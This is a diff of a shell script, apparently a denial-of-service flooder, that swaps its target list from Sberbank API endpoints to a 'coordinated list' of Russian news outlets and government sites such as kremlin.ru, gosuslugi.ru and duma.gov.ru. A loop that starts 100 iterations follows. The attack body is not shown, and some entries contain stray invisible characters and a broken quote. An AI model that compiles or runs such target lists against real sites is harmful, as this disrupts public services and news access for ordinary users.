@@ -47,9 +47,25 @@ fuck_these=(
 
 # Latest coordinated list, comment or remove these lines for long-running task
 fuck_these=(
-    "https://api.sberbank.ru/prod/tokens/v2​/oauth"
-    "​https://api.sberbank.ru/prod/tokens/v2​/oidc"
-    "https://api.developer.sber.ru/product/SberbankID"
+    "https://lenta.ru" 
+    "https://ria.ru"
+    "https://tvzvezda.ru"
+    "https://tass.ru"
+    "https://5-tv.ru"
+    "https://rg.ru"
+    "https://rtr-planeta.com"
+    "https://economy.gov.ru" 
+    "https://smotrim.ru"
+    "https://ac.gov.ru" 
+    "https://vgtrk.ru"
+    "https://data.gov.ru"
+    "http://council.gov.ru/" 
+    "http://duma.gov.ru/"
+    "https://rkn.gov.ru/"
+    "https://www.gosuslugi.ru/" 
+    "https://www.gov.spb.ru" 
+    "http://kremlin.ru/" 
+    "https://mchs.gov.ru'
 )
 
 for n in {1..100}; do 
